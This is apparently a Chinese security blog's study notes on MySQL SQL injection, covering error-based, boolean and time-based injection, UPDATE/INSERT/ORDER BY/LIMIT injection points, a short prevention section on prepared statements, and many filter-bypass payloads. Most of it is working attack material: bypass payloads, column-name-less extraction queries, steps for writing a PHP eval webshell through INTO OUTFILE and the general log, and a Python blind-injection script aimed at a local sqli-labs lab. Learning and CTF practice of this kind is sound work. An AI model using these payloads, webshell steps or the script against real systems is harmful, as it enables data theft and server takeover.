Title = "SQL注入"
description = "SQL注入"
tags = ["Web","Security"]
publishtime = 2021-07-27T00:15:00
lastedittime = 2021-08-28T17:03:00
uuid = "5134c576-2e83-4e1e-9b8f-cb6bd63bdc65"
-+_+-



# 1. Mysql变革



![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815133324.png)

# 2. 注入类型



## 概念

- 数字型与字符型注入最大的区别在于，数字型不需要单引号闭合，字符型通常需要闭合单引号。
- WHERE后的括号代表优先级。



![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815170304.png)

## 报错注入

通过构造错误语句，使得查询信息在错误语句中回显

## 布尔注入

布尔注入通过布尔值来判断查询的正确与否，语句执行结果为真，返回真值时候的信息，语句执行结果为假，返回假值时候的信息

## 延时注入

延时注入是布尔现象的变形利用，在原本真假值的位置中插入延时语句，通过响应时间来判断真假值。

SLEEP(n) 让mysql延时n秒钟

BENCHMARK(count,expr) 重复count次执行表达式expr

## 宽字节注入

> 当php开启gpc或者使用addslashes函数时，单引号`'`被加上反斜杠`\'`，其中`\`的URL编码为`%5C`，我们传入`%df'`，等价于`%df%5C'`，此时若程序的默认字符集是GBK，mysql用GBK编码时会认为`%df%5C`是一个宽字符`縗`，于是`%df%5C'`便等价于`縗'`，产生注入。

```text
id=1%df' and 1=2 union select 1,2,user(),4 %23
```





# 3. 注入位置



## Update注入

```sql
UPDATE TABLE test SET `username`='InjectionPoint' WHERE .....;
```

​	UPDATE是MYSQL中用于更改数据的关键字，一般来说通过报错来完成注入，这程序需要开启错误回显。

```sql
UPDATE TABLE test SET `username`='' or updatexml(2,concat(0x7e,(version())),0) WHERE .....;
```



### ❓如果关闭报错回显呢？

​	利用Mysql非严格模式下，字符串和数组进行或运算得到数字的特性，在关闭了报错的情况下将查询到的数据转换为十进制的数，然后与字符串进行**或运算**，得到的结果就是十进制的数，最终转换为对应的字符串即可。

```sql
UPDATE TABLE test SET `username`='mote'|conv(hex(version()),16,10)|'' WHERE .....;
```

- Mysql中十进制数字范围有限，可以使用`substr()`进行分割

```sql
UPDATE TABLE test SET `username`='mote'|conv(hex(substr(version(),1,5)),16,10)|'' WHERE .....;
```



## Insert注入

一般来说，Insert注入常见地方为文章更新，发表评论等等，这些地方一般使用Insert关键字来修改数据库记录

```sql
INSERT INTO TABELNAME(A,B,C) VALUES($A,$B,$C);
```

假如待插入变量中$A，$B，$C中任意一个变量是攻击者可控的，那么可以改变语句，实现插入多条记录，从而改变变量的上下文限制。

```sql
INSERT INTO TABELNAME(A,B,C) VALUES(A1,B1,C1),(A2,B2,C2);
```

​	例如在程序上下文中`INSERT INTO TABELNAME(A,B,C) VALUES('user',$B,$C);` 已经固定`Column A`的值为 `user`，通过改变`Column C`的值为 `C1),('admin',B2,C2` 即可插入多条记录，并且避开程序对于用户的限制，插入后语句变成了 `INSERT INTO TABELNAME(A,B,C) VALUES('user',B1,C1),('admin',B2,C2);`
​	如果进行多行插入时出现错误，有可能是程序存在隐藏的变量，需要通过响应来判断具体的Column数量来使得语句正确。



## Order By 注入

​	Order By 后可以填字段名或者数字，数字代表第几个字段

```sql
SELECT * FROM demo ORDER BY InjectionPoint;
```

​	 oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假，利用`asc`和`desc`关键词可以测试是否为`ORDER BY`注入

### 情况一：判断列数

```sql
SELECT * FROM demo ORDER BY 2
```

​	`ORDER BY`一般用来快速判断表中的列数量，而且根据语法`Union`无法跟在`ORDER BY`后面

### 情况二：结合LIMIT PROCEDURE

在使用`ORDER BY`的情况下，`Union`无法跟在`ORDER BY`后面但是可以接LIMIT PROCEDURE或者INTO



### 情况二：order by 盲注（知道字段名的情况下）

​	IF 语句返回的是字符类型，不是整型，因此不可以直接使用数字替代，需要知道字段名

```sql
SELECT * FROM demo ORDER BY IF(true,id,username);
```

​	可以利用以下两种盲注技巧

- order by rand()

	```sql
	SELECT * FROM demo ORDER BY RAND(true); #当rang()为true和false时，排序结果是不同的，所以就可以使用rang()函数进行盲注
	```

- 时间盲注

	```sql
	SELECT * FROM demo ORDER BY IF(true,1,sleep(1));
	```

	

### 情况三：order by 盲注（不需要知道字段名）

```sql
SELECT * FROM demo ORDER BY IF(true,id,username)
```

- 报错注入

	```sql
	SELECT * FROM demo ORDER BY updatexml(1,if(1=1,1,user()),1);
	```

- 时间盲注

	```sql
	SELECT * FROM demo ORDER BY IF(true,1,sleep(1));
	```



注：Order by 后面是不能参数化的，因为一般接的是字段名，如果带字段名那就变成字符串了



## Limit注入

### 情况一：不使用ORDER BY

```sql
SELECT id FROM users LIMIT InjectionPoint
```

​	这种情况下 `LIMIT`后面可以跟`UNION`进行联合查询注入

```sql
SELECT id FROM users LIMIT 0,1 UNION SELECT USERNAME FROM users;
```

### 情况一：使用ORDER BY

```sql
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT InjectionPoint
```

- 在使用`ORDER BY`的情况下，`Union`无法跟在`ORDER BY`后面
- 在Mysql 5的语法里`LIMIT`后可以跟`PROCEDURE` 和`INTO`

```sql
SELECT [ALL | DISTINCT | DISTINCTROW ] 
      [HIGH_PRIORITY] 
      [STRAIGHT_JOIN] 
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] 
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] 
    select_expr [, select_expr ...] 
    [FROM table_references 
    [WHERE where_condition] 
    [GROUP BY {col_name | expr | position} 
      [ASC | DESC], ... [WITH ROLLUP]] 
    [HAVING where_condition] 
    [ORDER BY {col_name | expr | position} 
      [ASC | DESC], ...] 
    [LIMIT {[offset,] row_count | row_count OFFSET offset}] 
    [PROCEDURE procedure_name(argument_list)] 
    [INTO OUTFILE 'file_name' export_options 
      | INTO DUMPFILE 'file_name' 
      | INTO var_name [, var_name]] 
    [FOR UPDATE | LOCK IN SHARE MODE]]
```


- PROCEDURE

	MySQL 默认可用的存储过程只有 `ANALYSE`，利用`PROCEDURE`可以利用参数类型不同进行报错注入或者延时注入，延时注入不能用`SLEEP`需要使用`BENCHMARK`

	- 报错注入

	```sql
	SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,version())),1);
	```

	- 延时注入

	```sql
	SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((SELECT extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
	```

	

- INTO

	如果要使用`INTO`需要有写权限以及相应的路径

	```sql
	SELECT * FROM test LIMIT 0,1 INTO OUTFILE 'test.txt';
	```

	可以用@来判断列数

	```sql
	SELECT * FROM test LIMIT 0,1 INTO @,@; # ERROR 1222 (21000): The used SELECT statements have a different number of columns
	SELECT * FROM test LIMIT 0,1 INTO @;
	```

# 4. 注入防止



1. 数据库设计规范：
	1. 每个字段取合适的数据类型和数据长度（增加攻击成本）

2. 数据库权限分配：
	1. 严格限制数据库权限（增加攻击成本，减少sql注入的危害）

3. 代码层面：
	1. 前端有效性校验和限制长度（增加攻击成本）
	2. sql预编译
	3. 使用过滤器进行sanitizer，转义敏感字符
	4. 捕获sql执行异常，避免异常信息的直接回显，使用不被侧信道的自定义异常
	5. sql执行异常监控并通知
	6. 使用waf
	7. 白名单检查（只允许合适的参数或函数）

> sql语句传入->检查缓存->规则验证->解析器解析为语法树->预处理器验证语法树->优化sql->生成执行计划->执行

​	❓为什么预编译可以防止Sql注入？

​	程序在执行查询之前，使用占位符?代替字段值的部分，将sql语句交由数据库进行预处理，省却了重复解析和优化相同语法树的时间，提升了SQL执行的效率（构建语法树，优化），并且对应的执行计划也会将sql缓存下来，赋予数据库参数化查询的能力，因此在运行时，可以动态的把参数传给预编译语句，即使参数中有敏感字符，也不会被拼接进语句中当作sql执行，无法再更改语法树的结构，而是当作一个参数或一个字段属性值来处理，不会再出现非预期的查询，这便是预编译能够防止SQL注入的根本原因。

​	❓使用预编译就不会有Sql注入了吗？

​	实际使用过程中仍有一些行为可能导致风险。

  - 开发人员是否正确使用预编译：例如PHP的PDO提供了两种预编译模式：本地预处理和模拟预处理，模拟预处理本质上还是进行sql拼接，只是增加了转义，因此还是有绕过的可能性，本地预处理则是利用数据库的预编译机制来完成
  - 并非所有参数都可以预编译：表名和列名是不能被预编译的。这是由于生成语法树的过程中，预处理器在进一步检查解析后的语法树时，会检查数据表和数据列是否存在，因此数据表和数据列不能被占位符?所替代。但在很多业务场景中，表名需要作为一个变量存在，因此这部分仍需由加号进行SQL语句的拼接，若表名是由外部传入且可控的，仍会造成SQL注入。
  - 同理，ORDER BY后的ASC/DESC也不能被预编译，当业务场景涉及到用户可控制排序方式，且ASC/DESC是由前台传入并拼接到SQL语句上时，就可能出现危险了。
  - like语句比如： like '%whataver%'， like '%%%' 返回所有数据，需要转义%变成 \%



# 5. 注入绕过



## 基础绕过

- 大小写绕过
- 双写绕过
- 内联注释



### 常见注释符

```
//，-- , /**/, #, --+, --     -, ;,%00,--a
```





## 过滤逗号

1. 使用 join 来进行绕过，可以绕过逗号

	```sql
	union select 1,2,3,4
	union select * from ((select 1)A join(select 2)B join (select 3)C join(select 4)D);
	```

2. 使用盲注时，往往需要用到逗号，可以使用 from to 方式来绕过

	```sql
	select substr(database() from 1 for 1);
	select mid(database() from 1 for 1);
	```

3. 使用 like 进行绕过

	```sql
	select ascii(mid(user(),1,1))=80  
	等价于
	select user() like 'r%'
	```



## 过滤引号

1. 使用十六进制来代替





## 过滤空格

1. `/**/` 和 `/*!*/` 和`<>` 可以替代空格

	```sql
	se/**/lect  slee/*!*/p  information_sch<>ema  sel<>ect   slee<>p 
	```

2. 使用回车空格制表符等控制字符

	```
	%20（Space） %09（HT） %0d（\\r） %0b（VT） %0c（FF） %0d （CR） %a0（No-Break Space） %0a （New Line）
	```

3. 使用括号(子查询)左右两边可以不连接空格

	```sql
	select(user())from dual where(1=1)and(2=2)
	```

4. 浮点数后可以省略空格

	```sql
	select * from (select 8.0union select 2.0)a;
	```

	



## 过滤延时函数

如果延时函数无法使用，可以使用重复执行，消耗计算资源的形式来达到延时的效果





## 过滤 Limit 关键字

如果过滤了limit 可以使用 offset来代替，同时也绕过逗号过滤

```sql
select * from news limit 0,1
```

\# 等价于下面这条SQL语句

```sql
select * from news limit 1 offset 0
```

 

## 过滤<，>

1. 如果使用sqlmap可以使用between脚本绕过，between a and b 返回a，b之间的数据，不包含b
2. 使用greatest函数和least函数

```sql
select * from users where id=1 and ascii(substr(database(),0,1))>64

select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
```

 

## 过滤 or and xor not

1. and=&&
2. or=||
3. xor=|
4. not=！



## 过滤 information_schema

在2019-2020年间的CTF比赛比较流行的一类SQL注入题目都喜欢过滤 `information_schema`，`information_schema`是mysql获取表名的最主要途径，在这种情况下可以有以下思路：

1. 利用InnoDB中的表，如` innodb_table_stats` 和`innodb_index_stats`，`innodb_index_stats` 会有重复的表名记录（这两个表无法获取column名字，需要配合子查询来使用）

```sql
select concat(table_name) from mysql.innodb_table_stats where database_name = database()

select concat(table_name) from mysql.innodb_index_stats where database_name = database()
```

2. 使用内联注释 `/*!code*/`

```sql
select table_name from /*!InfoRmAtion_sCheMa*/.tables;
```

3. 利用 sys 表，与1相同，无法获取column 名字，需要配合子查询

```sql
# schema_auto_increment_columns
select concat(table_name) from sys.schema_auto_increment_columns where table_schema = database();
# schema_table_statistics_with_buffer 
# x$schema_table_statistics_with_buffer
select concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema = database();
select concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema = database();
```

4. performance_schema

```sql
SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();
```



## 过滤 concat



![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815211057.png)

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815211114.png)

将bits转为二进制，1的二进制为0001，倒过来为1000，取比特位为1的字符，这里从左往右取字符串，若该字符串所对应位置的比特位为0，则不取。最后返回比特位为1的子字符串由逗号分隔拼接的字符串。

```sql
select updatexml(1,make_set(3,'~',(select flag from flag)),1);
```





# 6. 注入Trick



## 利用Order By判断列数

```
select * from test order by 2;
```



## Order By 无列名注入

1. 如果场景中无法通过columns获取列名，可以通过union select 和 order by来爆破从而绕过列名限制

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815210348.png)

可以通过虚拟的表来逐位逐位的得到被过滤的dog字段的值，在mysql中的排序，数字比字母先，字符串从前往后逐位比较。

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815210552.png)



## 利用子查询（union+别名）进行无列名注入

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815210723.png)

比如

```mysql
select `1` from (select 1,2,3,4,5,6,7,8 union select * from users)a limit 1 offset 1;
select x.1 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d,(select 5)e,(select 6)f,(select 7)g,(select 8)h union select * from users)x limit 1 offset 1;
select b from (select 1,2,3 as b union select * from admin)a;
```



```mysql
id='1'-if(substr((select concat(`1`,0x3a,`2`) from (select 1,2 union select * from flag)a limit 1,1),{},1)='{}',concat(sleep(3),1-~0),1-~0)-'
```



## 利用 Join 进行无列名注入



```mysql
select * from (select * from (select 1 `a`)m join (select 2 `b`)n union select * from test3)x;
 
select a from (select * from (select 1 `a`)m join (select 2 `b`)n union select * from test3)x;
```



## 利用join 、 join + using 报错获取列名



```sql
mysql> select * from (select * from test3 as a join test3 b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from (select * from test3 as a join test3 b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'username'
```

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815213522.png)



# 7. 权限相关







## 文件相关

查询用户读写权限

```
SELECT file_priv FROM mysql.user WHERE user = 'username';
```

### load_file

load_file函数：

> 1、文件权限：需要有文件读权限，可以查询file_priv
>
> 2、文件大小: 必须小于max_allowed_packet 
>
> 3、文件绝对路径：需要知道绝对路径



### select导出

> 1、绝对路径
>
> 2、导出的目录具有可写权限
>
> 3、outfile 的文件不可以存在

# 8. 提权



## udf提权

user defined function，用户自定义函数，通过添加新函数，对mysql的功能进行扩充，利用sql文件写功能和进制转换将dll的binary写入数据库能访问的目录（通常是plugin目录），然后引入该函数执行命令。

ps：一个是受写权限制约，另一个受basedir的制约





# 9. Mysql Getshell的几种方式



sqlmap --os-shell的原理

1. 普通写Webshell

	> 条件：
	>
	> 1. 是否有数据导出权限 secure_file_priv
	> 2. Web目录绝对路径
	> 3. Web目录的写权限

```sql
1 union select xxx into outfile  # 联合查询
1 into outfile  # 无联合查询
```

如果注入点是盲注或者报错注入，可以利用分隔符写入

```
1 limit 0,1 into outfile '' lines terminated by hex编码 --
```





2. 利用log写入

	> 新版本mysql设置了导出文件的路径，很难使用普通select into outfile这种方式写入
	>
	> 所以可以利用mysql的log文件来获取webshell
	>
	> 条件：
	>
	> 1. global general_log 需要为 on     （show variables like '%general%'）
	> 2. 用户需要Super和File服务器权限
	> 3. 需要知道绝对路径

```sql
show variables like ‘%general%’;
查询当前mysql下log日志的默认地址，同时也看下log日志是否为开启状态，并且记录下原地址，方便后面恢复。

set global general_log = on;
开启日志监测，一般是关闭的，如果一直开，文件会很大的。

set global general_log_file = ‘新路径’;
这里设置我们需要写入的路径就可以了。

select ‘<?php eval($_POST[‘shiyan’]);?>’;
查询一个一句话，这个时候log日志里就会记录这个。

set global general_log_file = ‘原路径’;
结束后，再修改为原来的路径。

set global general_log = off;
关闭下日志记录。
```





2. 

# 9. 板子



二分法板子：

```python
#!/usr/bin/python3
#coding:utf-8
import requests
import re, string

# payloadTmpl = "(slect if(substr(version(),{},1)>{},exp(72),exp(800)));%23"
# proxy = {"http":"http://127.0.0.1:8080"}
url = "http://localhost/sqli-labs-php7/Less-5/?id=1%27 and ascii(substr((select database()),{},1))>{} %23"
SuccessFlag = "You are in..."

def sendReq(payload):
    res = requests.get(payload)
    return res

def verify(payload):
    r = sendReq(payload)
    if re.findall(SuccessFlag, r.text) != []:
        return True
    return False

def half_interval():
    result = ""
    for i in range(1,9):
        min = 32
        max = 127
        while abs(max-min) > 1:
            mid = (min + max)//2
            # payload = payloadTmpl.format(i,mid)
            payload = url.format(i,mid)
            print(payload)
            if verify(payload):
                min = mid
            else:
                max = mid
        result += chr(max)
        print(result)

if __name__ == "__main__":
    half_interval()
```



